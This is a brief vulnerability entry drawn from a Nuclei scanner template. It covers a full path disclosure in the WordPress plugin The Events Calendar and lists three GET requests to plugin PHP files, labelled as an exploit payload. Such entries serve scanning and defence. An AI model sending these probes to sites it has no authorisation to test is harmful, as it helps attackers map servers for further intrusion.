# Vulnerability: WordPress The Events Calendar - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-the-events-calendar-fpd.yaml`)

## Description
WordPress The Events Calendar plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/the-events-calendar/src/Tribe/Main.php
GET {{BaseURL}}/wp-content/plugins/the-events-calendar/src/Tribe/Admin/Admin.php
GET {{BaseURL}}/wp-content/plugins/the-events-calendar/common/src/Tribe/Main.php
```

